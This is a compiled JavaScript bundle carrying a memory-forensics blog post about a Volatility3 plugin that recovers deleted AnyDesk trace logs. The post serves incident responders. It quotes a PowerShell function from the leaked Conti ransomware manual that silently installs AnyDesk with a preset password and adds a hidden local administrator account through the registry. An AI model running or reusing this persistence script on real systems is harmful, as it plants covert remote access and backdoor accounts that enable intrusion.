"use strict";(self.webpackChunkexhume=self.webpackChunkexhume||[]).push([[9835],{5960:e=>{e.exports=JSON.parse('{"permalink":"/blog/anydesk","source":"@site/blog/2022-09-30-anydesk/index.md","title":"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk","description":"When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.","date":"2022-09-30T00:00:00.000Z","tags":[{"inline":true,"label":"DFIR","permalink":"/blog/tags/dfir"},{"inline":true,"label":"Memory Forensics","permalink":"/blog/tags/memory-forensics"},{"inline":true,"label":"Anydesk","permalink":"/blog/tags/anydesk"},{"inline":true,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":12.15,"hasTruncateMarker":true,"authors":[{"name":"k1nd0ne","title":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","page":{"permalink":"/blog/authors/k-1-nd-0-ne"},"socials":{"x":"https://x.com/k1nd0ne","github":"https://github.com/k1nd0ne","bluesky":"https://bsky.app/profile/k1nd0ne.bsky.social"},"imageURL":"https://avatars.githubusercontent.com/u/27780432?v=4","key":"k1nd0ne"}],"frontMatter":{"slug":"anydesk","title":"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk","authors":["k1nd0ne"],"tags":["DFIR","Memory Forensics","Anydesk","Windows"]},"unlisted":false,"prevItem":{"title":"\ud83e\uddec Malware Analysis with VISION-ProcMon","permalink":"/blog/vision"},"nextItem":{"title":"\ud83d\udce6 Volatility3 Linux Plugin - Inodes","permalink":"/blog/inodes"}}')},7155:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>f,frontMatter:()=>o,metadata:()=>s,toc:()=>l});var s=t(5960),i=t(4848),a=t(8453);const o={slug:"anydesk",title:"\ud83d\udce6 Volatility3 Windows Plugin - AnyDesk",authors:["k1nd0ne"],tags:["DFIR","Memory Forensics","Anydesk","Windows"]},r=void 0,c={authorsImageUrls:[void 0]},l=[{value:"AnyDesk trace files",id:"anydesk-trace-files",level:2},{value:"The anti-forensics scenario",id:"the-anti-forensics-scenario",level:2},{value:"Writing a Volatility3 plugin",id:"writing-a-volatility3-plugin",level:2},{value:"Conclusion",id:"conclusion",level:2}];function d(e){const n={a:"a",code:"code",em:"em",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",section:"section",strong:"strong",sup:"sup",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(n.p,{children:["When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.\nAnyDesk",(0,i.jsx)(n.sup,{children:(0,i.jsx)(n.a,{href:"#user-content-fn-1-026302",id:"user-content-fnref-1-026302","data-footnote-ref":!0,"aria-describedby":"footnote-label",children:"1"})})," is one of those software being extensively used as a sublayer of persistence by threat actors or access other servers in the environment via RDP",(0,i.jsx)(n.sup,{children:(0,i.jsx)(n.a,{href:"#user-content-fn-2-026302",id:"user-content-fnref-2-026302","data-footnote-ref":!0,"aria-describedby":"footnote-label",children:"2"})}),".\nThe latter has been often encountered in the wild in the past years as a preferred tool leveraged by known threat actors."]}),"\n",(0,i.jsx)(n.p,{children:"As such, Anydesk should be closely monitored as threat actors could easily alter or delete data after a successful attack; sometimes it is not possible to restore those altered logs. Defending against malicious actions with such remote software can be even more intricate for organizations having approved its legitimate usage.\nHere we propose to leverage memory forensics to retrieve and analyze artefacts thanks to a custom Volatility plugin that I made available as a free open-source tool for improving digital investigations."}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.em,{children:(0,i.jsx)(n.strong,{children:"Conti AnyDesk installation tutorial"})})}),"\n",(0,i.jsxs)(n.p,{children:["A striking example came out the last year upon leaked manuals of Conti\u2019s ransomware-as-a-service operators dedicated to its affiliates with pentesting skills",(0,i.jsx)(n.sup,{children:(0,i.jsx)(n.a,{href:"#user-content-fn-3-026302",id:"user-content-fnref-3-026302","data-footnote-ref":!0,"aria-describedby":"footnote-label",children:"3"})}),".  From this case we can learn how the tool was installed by the attacker using PowerShell."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-PowerShell",children:'\u0417\u0430\u043a\u0440\u0435\u043f AnyDesk  - \u043e\u0437\u043d\u0430\u043a\u043e\u043c\u0438\u0442\u044c\u0441\u044f \u0432\u0441\u0435\u043c\n Function AnyDesk {\n\n    mkdir "C:\\ProgramData\\AnyDesk"\n    # Download AnyDesk\n    $clnt = new-object System.Net.WebClient\n    $url = "http://download.anydesk.com/AnyDesk.exe"\n    $file = "C:\\ProgramData\\AnyDesk.exe"\n    $clnt.DownloadFile($url,$file)\n\n\n    cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent\n\n\n    cmd.exe /c echo J9kzQ2Y0qO | C:\\ProgramData\\anydesk.exe --set-password\n\n\n    net user oldadministrator "qc69t4B#Z0kE3" /add\n    net localgroup Administrators oldadministrator /ADD\n    reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f\n\n    cmd.exe /c C:\\ProgramData\\AnyDesk.exe --get-id\n\n    }\n\n    AnyDesk\n'})}),"\n",(0,i.jsx)(n.p,{children:"In this blog post, we will cover which files linked to anydesk are useful and how valuable it can be upon an investigation. Eventually, in the case where an intrusion set is deleting those files using an anti-forensics technique, a volatility3 plugin will be proposed to retrieve that information, which might still reside in memory."}),"\n",(0,i.jsx)(n.h2,{id:"anydesk-trace-files",children:"AnyDesk trace files"}),"\n",(0,i.jsxs)(n.p,{children:["When using Anydesk, specific files",(0,i.jsx)(n.sup,{children:(0,i.jsx)(n.a,{href:"#user-content-fn-4-026302",id:"user-content-fnref-4-026302","data-footnote-ref":!0,"aria-describedby":"footnote-label",children:"4"})})," are written to trace the activity of the application. There are two files of particular interest:"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"ad.trace"}),"\n",(0,i.jsx)(n.li,{children:"ad_svc.trace (only at installed version)"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["On a windows 10 machine, you can respectively find those files in the ",(0,i.jsx)(n.code,{children:"%APPDATA%\\AnyDesk\\"})," and ",(0,i.jsx)(n.code,{children:"%SYSTEMROOT%\\ProgramData\\AnyDesk\\"}),".\nHere is an example of data you could find within the log file:"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.em,{children:(0,i.jsx)(n.strong,{children:"ad.trace content example"})})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"info 2022-09-27 15:31:53.920       back   3240   5476                   app.backend_session - Starting session (deskrt, clipboard, chat, audio, input, tcp_tunnel).\ninfo 2022-09-27 15:31:53.920       back   3240   5476                       desk_rt.encoder - 2 segments.\ninfo 2022-09-27 15:31:53.923       back   3240   5476                     base.monitor_info - Monitors found: 1\ninfo 2022-09-27 15:31:53.923       back   3240   5476                   app.backend_session - Suspending session start until further notice.\ninfo 2022-09-27 15:31:53.925       back   3240   5476                   app.backend_session - Continueing session start.\ninfo 2022-09-27 15:31:53.925       back   3240   5476             desk_rt.capture_component - Starting capture.\ninfo 2022-09-27 15:31:53.925       back   3240   3892            capture.dda_stream_capture - Initializing D3D.\ninfo 2022-09-27 15:31:53.926       ctrl   6572   1320                        ad_app.control - Session count: (1, 1)\ninfo 2022-09-27 15:31:53.927       ctrl   6572   1320                       clipbrd.capture - Registered for clipboard notifications.\ninfo 2022-09-27 15:31:53.927       ctrl   6572   1320                    app.ctrl_clip_comp - Ready.\ninfo 2022-09-27 15:31:53.927       ctrl   6572   1320                     win_app.wallpaper - Starting wallpaper.\ninfo 2022-09-27 15:31:53.948       back   3240   5476             desk_rt.capture_component - Sending screen privacy status: off (no change).\ninfo 2022-09-27 15:31:53.948       back   3240   5476                        app.mouse_sink - Starting mouse sink.\ninfo 2022-09-27 15:31:53.950       back   3240   4136             desk_rt.capture_component - Keyboard layout changed to: unknown\ninfo 2022-09-27 15:31:53.950       back   3240   4136             desk_rt.capture_component - Focused monitor changed: 0 (\\\\.\\DISPLAY1)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.em,{children:(0,i.jsx)(n.strong,{children:"ad_svc.trace content example"})})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"info 2022-09-27 15:30:44.538       gsvc   9068   5920    1                      app.service - New IPC connection.\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920    1                  fiber.scheduler - Spawning child fiber 13 (parent 1).\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Creating an IPC accept socket.\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Connected to 6572 (control:1).\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Process login detected.\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                      app.service - Using existing control (6572).\n  info 2022-09-27 15:30:44.538       gsvc   9068   5920   13                  fiber.scheduler - Spawning child fiber 14 (parent 13).\n  info 2022-09-27 15:30:48.601       gsvc   9068   5920    1                      app.service - Process start: 3524 (frontend).\n  info 2022-09-27 15:30:48.601       gsvc   9068   5920    1           anynet.relay_connector - Short timeouts enabled.\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920    1                      app.service - New IPC connection.\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920    1                  fiber.scheduler - Spawning child fiber 15 (parent 1).\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920   15                      app.service - Creating an IPC accept socket.\n  info 2022-09-27 15:30:48.742       gsvc   9068   5920   15                      app.service - Connected to 3524 (frontend).\n  info 2022-09-27 15:30:49.139       gsvc   9068   5920   15                      app.service - Process login detected.\n  info 2022-09-27 15:30:49.139       gsvc   9068   5920   15                  fiber.scheduler - Spawning child fiber 16 (parent 15).\n  info 2022-09-27 15:30:50.477       gsvc   9068   5920   15                            gcpsa - Downloading gcapi.dll.\n error 2022-09-27 15:30:50.518       gsvc   9068   5920   15                 win_app.dir_file - Could not open file (2).\n  info 2022-09-27 15:30:50.518       gsvc   9068   5920   15                  fiber.scheduler - Spawning child fiber 17 (parent 15).\n  info 2022-09-27 15:30:50.918       gsvc   9068   5920                       fiber.scheduler - Fiber 17 terminated.\n  info 2022-09-27 15:30:51.175       gsvc   9068   5920   13                  fiber.scheduler - Spawning child fiber 18 (parent 13).\n  info 2022-09-27 15:30:51.586       gsvc   9068   5920   15           anynet.main_relay_conn - Reporting system information.\n  info 2022-09-27 15:30:52.221       gsvc   9068   5920                       fiber.scheduler - Fiber 18 terminated.\n  info 2022-09-27 15:31:31.131       gsvc   9068   5920    4                  fiber.scheduler - Spawning root fiber 19.\n  info 2022-09-27 15:31:31.131       gsvc   9068   5920   19            anynet.connection_mgr - [192.168.164.130:49152] Incoming connection.\n  info 2022-09-27 15:31:31.147       gsvc   9068   5920   19                  fiber.scheduler - Spawning root fiber 20.\n  info 2022-09-27 15:31:31.272       gsvc   9068   5920   19                  fiber.scheduler - Spawning root fiber 21.\n  info 2022-09-27 15:31:31.287       gsvc   9068   5920   19                        handshake - Using protocol version 1.\n  info 2022-09-27 15:31:31.287       gsvc   9068   5920   19            anynet.connection_mgr - [192.168.164.130:49152] Direct connection.\n"})}),"\n",(0,i.jsx)(n.p,{children:"We can see that it is possible to extract useful artifacts.\nHereby is a non-exhaustive list:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"AnyDesk version"}),"\n",(0,i.jsx)(n.li,{children:"The IP address of the AnyDesk relay used when initiating a connection"}),"\n",(0,i.jsx)(n.li,{children:"Timestamps of each action"}),"\n",(0,i.jsx)(n.li,{children:"Listening port"}),"\n",(0,i.jsx)(n.li,{children:"Incoming connection IP address"}),"\n",(0,i.jsx)(n.li,{children:"Involved PIDs"}),"\n",(0,i.jsx)(n.li,{children:"Number of monitors found"}),"\n",(0,i.jsx)(n.li,{children:"Install date"}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"the-anti-forensics-scenario",children:"The anti-forensics scenario"}),"\n",(0,i.jsxs)(n.p,{children:["If the adversary is aware of those artifacts, he might delete those files. However, there is still a chance to retrieve those cached files in memory!\nIn this example, our is setup is 2 windows 10 virtual machine (",(0,i.jsx)(n.strong,{children:"A"})," and ",(0,i.jsx)(n.strong,{children:"B"}),"). ",(0,i.jsx)(n.strong,{children:"A"})," (attacker) is initiating a remote anydesk connection to ",(0,i.jsx)(n.strong,{children:"B"})," (victim).\nAfter a while the session is disconnected and A deleted the ad.trace and ad_svc.trace files.\nNext, a memory dump of machine ",(0,i.jsx)(n.strong,{children:"B"})," is performed, ready to be analyzed."]}),"\n",(0,i.jsx)("div",{style:{backgroundColor:"white",alignItems:"center"},children:(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"alt text",src:t(8853).A+"",title:"Investigation scenario",width:"1829",height:"1007"})})}),"\n",(0,i.jsx)(n.h2,{id:"writing-a-volatility3-plugin",children:"Writing a Volatility3 plugin"}),"\n",(0,i.jsxs)(n.p,{children:["Using volatility3",(0,i.jsx)(n.sup,{children:(0,i.jsx)(n.a,{href:"#user-content-fn-5-026302",id:"user-content-fnref-5-026302","data-footnote-ref":!0,"aria-describedby":"footnote-label",children:"5"})})," we can write a custom plugin which will perform the following steps :"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Look for ad.trace and ad_svc.trace using the filescan plugin;"}),"\n",(0,i.jsx)(n.li,{children:"Try to dump the files if found;"}),"\n",(0,i.jsx)(n.li,{children:"Parse the files and render the data to the investigator."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Indeed, we could just dump the file and analyze it offline. However, writing a dedicated plugin is useful to:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Interface with the Timeliner plugin and make timestamps correlation with other artifacts;"}),"\n",(0,i.jsx)(n.li,{children:"Interface with any other tools that are exploiting the other volatility3 output capabilities (json, csv, ...)."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.em,{children:(0,i.jsx)(n.strong,{children:"Plugin output example"})})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"~/work/DFIR/Memory Analysis/MemoryImages/Windows10_AnyDesk \xbb vol -f Windows_AD.vmem anydesk\nVolatility 3 Framework 2.0.1\nProgress:  100.00\t\tPDB scanning finished\nSource\tType\tTime\tContext\tMessage\n[...]\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:14:32.854000 \tgsvc\tMain relay connection established.\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:14:32.854000 \tgsvc\tNew user data. Client-ID: 684537884.\n\\ProgramData\\AnyDesk\\ad_svc.trace\terror\t2022-09-30 19:14:32.954000 \tgsvc\tpacket-type(60)\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.766000 \tgsvc\tSpawning root fiber 37.\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.766000 \tgsvc\t[192.168.164.130:52257] Incoming connection.\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.766000 \tgsvc\tSpawning root fiber 38.\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.867000 \tgsvc\tSpawning root fiber 39.\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.867000 \tgsvc\tUsing protocol version 1.\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.867000 \tgsvc\t[192.168.164.130:52257] Direct connection.\n[...]\n\\ProgramData\\AnyDesk\\ad_svc.trace\tinfo\t2022-09-30 19:37:36.926000 \tgsvc\tBackend PID: 1268\n[...]\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.em,{children:(0,i.jsx)(n.strong,{children:"Using the timeliner plugin"})})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'[...]\nAnydesk\tAnyDesk: info Fiber 20 terminated.  \t2022-09-27 15:30:21.968000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info Fiber 20 terminated.  \t2022-09-27 15:30:21.968000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info Starting installation of AnyDesk.  \t2022-09-27 15:30:35.484000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info Opening UAC dialog.  \t2022-09-27 15:30:35.484000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info line: "C:\\Users\\Volatility\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\AnyDesk (1).exe" --install "C:\\Program Files (x86)\\AnyDesk"  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf "C:\\Users\\Volatility\\AppData\\Roaming\\AnyDesk\\service.conf"  --sys-conf "C:\\Users\\Volatility\\AppData\\Roaming\\AnyDesk\\system.conf"  \t2022-09-27 15:30:35.484000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info Starting installation of AnyDesk.  \t2022-09-27 15:30:35.484000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info Opening UAC dialog.  \t2022-09-27 15:30:35.484000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info line: "C:\\Users\\Volatility\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\AnyDesk (1).exe" --install "C:\\Program Files (x86)\\AnyDesk"  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf "C:\\Users\\Volatility\\AppData\\Roaming\\AnyDesk\\service.conf"  --sys-conf "C:\\Users\\Volatility\\AppData\\Roaming\\AnyDesk\\system.conf"  \t2022-09-27 15:30:35.484000 \tN/A\tN/A\tN/A\nSymlinkScan\tSymlink: Global -> \\BaseNamedObjects\t2022-09-27 15:30:37.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 380 svchost.exe Loaded rsaenh.dll (C:\\Windows\\system32\\rsaenh.dll) Size 208896 Offset 140735643516928\t2022-09-27 15:30:40.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 380 svchost.exe Loaded CRYPTBASE.dll (C:\\Windows\\System32\\CRYPTBASE.dll) Size 49152 Offset 140735649873920\t2022-09-27 15:30:40.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 3680 explorer.exe Loaded LINKINFO.dll (C:\\Windows\\SYSTEM32\\LINKINFO.dll) Size 53248 Offset 140735555567616\t2022-09-27 15:30:41.000000 \tN/A\tN/A\tN/A\nPsList\tProcess: 9068 AnyDesk.exe (221603241440448)\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nPsList\tProcess: 9068 AnyDesk.exe (221603241440448)\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nPsScan\tProcess: 9068 AnyDesk.exe (221603241440448)\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nPsScan\tProcess: 9068 AnyDesk.exe (221603241440448)\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 380 svchost.exe Loaded SHELL32.dll (C:\\Windows\\System32\\SHELL32.dll) Size 21954560 Offset 140735700271104\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 3680 explorer.exe Loaded EhStorShell.dll (C:\\Windows\\System32\\EhStorShell.dll) Size 225280 Offset 140735394414592\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 9068 AnyDesk.exe Loaded AnyDesk.exe (C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe) Size 16338944 Offset 19005440\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 9068 AnyDesk.exe Loaded <volatility3.framework.renderers.UnreadableValue object at 0x1464d7520> (<volatility3.framework.renderers.UnreadableValue object at 0x1464d7520>) Size 2019328 Offset 140735723339776\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 9068 AnyDesk.exe Loaded wow64.dll (C:\\Windows\\System32\\wow64.dll) Size 339968 Offset 140735698370560\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 9068 AnyDesk.exe Loaded wow64win.dll (C:\\Windows\\System32\\wow64win.dll) Size 507904 Offset 140735699550208\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nDllList\tDLL Load: Process 9068 AnyDesk.exe Loaded wow64cpu.dll (C:\\Windows\\System32\\wow64cpu.dll) Size 36864 Offset 2002452480\t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nNetScan\tNetwork connection: Process 9068 AnyDesk.exe Local Address 0.0.0.0:7070 Remote Address 0.0.0.0:0 State LISTENING Protocol TCPv4 \t2022-09-27 15:30:42.000000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info * AnyDesk Windows Startup *  \t2022-09-27 15:30:42.636000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info * Version 7.0.14 (release/win_7.0.x 5cf8483107cd52198359a9504e0641fbe8cc59b3)  \t2022-09-27 15:30:42.636000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info * Custom Client (no ID)  \t2022-09-27 15:30:42.636000 \tN/A\tN/A\tN/A\nAnydesk\tAnyDesk: info * Checksum 1b8e6bc34e8cd533b5d7281935ff2761  \t2022-09-27 15:30:42.636000 \tN/A\tN/A\tN/A\n'})}),"\n",(0,i.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,i.jsxs)(n.p,{children:["This plugin was tested on Windows 10 memory dumps and the code can be found on the forensicxlab github : ",(0,i.jsx)(n.a,{href:"https://github.com/forensicxlab/volatility3_plugins",children:"https://github.com/forensicxlab/volatility3_plugins"}),".\nI would like to thank @DebugPrivilege for the tweet",(0,i.jsx)(n.sup,{children:(0,i.jsx)(n.a,{href:"#user-content-fn-6-026302",id:"user-content-fnref-6-026302","data-footnote-ref":!0,"aria-describedby":"footnote-label",children:"6"})})," he made about the subject that gave me the idea to write this plugin."]}),"\n",(0,i.jsx)(n.p,{children:'AnyDesk is only one of the techniques used by threat actors to establish persistence via remote access. It is possible that other posts of the same type dealing with RA tools like "Atera" will come out in a few weeks.'}),"\n",(0,i.jsxs)(n.p,{children:["It will be submitted to the volatility3 foundation for integration to the framework. You should Identify each steps described before in the source code comments.\nDo not hesitate to reach me at ",(0,i.jsx)(n.a,{href:"mailto:felix.guyard@forensicxlab.com",children:"felix.guyard@forensicxlab.com"}),", or to make a pull-request on the repository to enhance this plugin or this article."]}),"\n",(0,i.jsx)(n.p,{children:"Happy Hunting!"}),"\n","\n",(0,i.jsxs)(n.section,{"data-footnotes":!0,className:"footnotes",children:[(0,i.jsx)(n.h2,{className:"sr-only",id:"footnote-label",children:"Footnotes"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{id:"user-content-fn-1-026302",children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://anydesk.com/en",children:"https://anydesk.com/en"})," ",(0,i.jsx)(n.a,{href:"#user-content-fnref-1-026302","data-footnote-backref":"","aria-label":"Back to reference 1",className:"data-footnote-backref",children:"\u21a9"})]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{id:"user-content-fn-2-026302",children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/",children:"https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/"})," ",(0,i.jsx)(n.a,{href:"#user-content-fnref-2-026302","data-footnote-backref":"","aria-label":"Back to reference 2",className:"data-footnote-backref",children:"\u21a9"})]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{id:"user-content-fn-3-026302",children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba",children:"https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba"})," ",(0,i.jsx)(n.a,{href:"#user-content-fnref-3-026302","data-footnote-backref":"","aria-label":"Back to reference 3",className:"data-footnote-backref",children:"\u21a9"})]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{id:"user-content-fn-4-026302",children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://support.anydesk.com/knowledge/trace-files",children:"https://support.anydesk.com/knowledge/trace-files"})," ",(0,i.jsx)(n.a,{href:"#user-content-fnref-4-026302","data-footnote-backref":"","aria-label":"Back to reference 4",className:"data-footnote-backref",children:"\u21a9"})]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{id:"user-content-fn-5-026302",children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://volatility3.readthedocs.io/en/latest/index.html",children:"https://volatility3.readthedocs.io/en/latest/index.html"})," ",(0,i.jsx)(n.a,{href:"#user-content-fnref-5-026302","data-footnote-backref":"","aria-label":"Back to reference 5",className:"data-footnote-backref",children:"\u21a9"})]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{id:"user-content-fn-6-026302",children:["\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"https://twitter.com/debugprivilege/status/1574435608713658368?s=21&t=PWI9kJEpzECxhbyNFR8YUQ",children:"https://twitter.com/debugprivilege/status/1574435608713658368?s=21&t=PWI9kJEpzECxhbyNFR8YUQ"})," ",(0,i.jsx)(n.a,{href:"#user-content-fnref-6-026302","data-footnote-backref":"","aria-label":"Back to reference 6",className:"data-footnote-backref",children:"\u21a9"})]}),"\n"]}),"\n"]}),"\n"]})]})}function f(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var s=t(6540);const i={},a=s.createContext(i);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),s.createElement(a.Provider,{value:n},e.children)}},8853:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/scenario-9761799e8d300f51d09bbbf7ad5e290a.png"}}]);